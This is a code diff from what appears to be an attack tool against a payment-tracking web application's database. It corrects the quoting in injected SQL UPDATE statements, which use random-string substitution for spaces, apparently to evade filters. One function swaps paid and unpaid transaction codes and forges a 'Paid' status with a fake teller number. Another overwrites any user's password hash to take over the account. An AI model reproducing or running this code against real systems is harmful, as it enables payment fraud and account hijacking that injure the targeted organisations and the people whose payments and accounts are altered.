@@ -56,17 +56,17 @@ def swap_txn_id():
     rrr = input("\nEnter the rrr%s"%(shell_char))
     teller_no = "000000"
     payment_status = "Paid"
-    dummy_txn_id = "666611118888"
-    set_paid_id_2_dummy_query = "UPDATE tbltransaction SET transcode={} where transcode={}".replace(' ', get_rand_string()).format(dummy_txn_id, paid_txn_id)
+    dummy_txn_id = "AU6611118888"
+    set_paid_id_2_dummy_query = "UPDATE tbltransaction SET transcode='{}' where transcode='{}'".replace(' ', get_rand_string()).format(dummy_txn_id, paid_txn_id)
     if queryDB(set_paid_id_2_dummy_query):
         print("Successfully changed paid txn_id to dummy txn_id")
-        set_unpaid_id_to_paid_query = "UPDATE tbltransaction SET transcode={} where transcode={}".replace(' ', get_rand_string()).format(paid_txn_id, unpaid_txn_id)
+        set_unpaid_id_to_paid_query = "UPDATE tbltransaction SET transcode='{}' where transcode='{}'".replace(' ', get_rand_string()).format(paid_txn_id, unpaid_txn_id)
         if queryDB(set_unpaid_id_to_paid_query):
             print("updated unpaid txn_id to paid txn_id")
-            set_paid_id_2_unpaid_query = "UPDATE tbltransaction SET transcode={} where transcode={}".replace(' ', get_rand_string()).format(unpaid_txn_id, dummy_txn_id)
+            set_paid_id_2_unpaid_query = "UPDATE tbltransaction SET transcode='{}' where transcode='{}'".replace(' ', get_rand_string()).format(unpaid_txn_id, dummy_txn_id)
             if queryDB(set_paid_id_2_unpaid_query):
                 print("updated paid txn_id to unpaid txn_id and removed dummy txn_id")
-                update_fields_query = "UPDATE tbltransaction SET paymentstatus={}, dategen={}, datepaid={}, tellerno={}, rrr={} where transcode={}".replace(' ', get_rand_string()).format(payment_status, date_gen, date_paid, teller_no, rrr, paid_txn_id)
+                update_fields_query = "UPDATE tbltransaction SET paymentstatus='{}', dategen='{}', datepaid='{}', tellerno='{}', rrr='{}' where transcode='{}'".replace(' ', get_rand_string()).format(payment_status, date_gen, date_paid, teller_no, rrr, paid_txn_id)
                 if queryDB(update_fields_query):
                     print("Swap completed succesfully")
                 else:
@@ -96,7 +96,7 @@ def change_password():
 def change_hash():
     username = input("\nEnter username%s"%(shell_char))
     password_hash = input("\nEnter the new password hash you want to set%s"%(shell_char))
-    make_admin_query = "UPDATE tblusers SET pwd={} where username='{}'".replace(' ', get_rand_string()).format(password_hash, username)
+    make_admin_query = "UPDATE tblusers SET pwd='{}' where username='{}'".replace(' ', get_rand_string()).format(password_hash, username)
     if queryDB(make_admin_query):
         print("print password was successfully set to {}".format(password_hash))
 
